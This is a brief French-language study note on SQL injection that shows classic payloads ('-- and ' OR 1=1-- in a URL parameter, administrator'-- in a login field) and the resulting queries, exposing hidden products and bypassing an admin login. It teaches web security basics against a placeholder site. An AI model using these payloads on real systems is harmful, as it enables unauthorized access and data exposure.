# SQL Injection

## Récupération de données cachées

Afficher les articles cachés d'un shop :

```
https://insecure-website.com/products?category=Gifts'--
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

## Détournement de la logique applicative

Contourner le formulaire de login avec le compte admin : 

```
user : administrator'--
password : test
```

```
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```
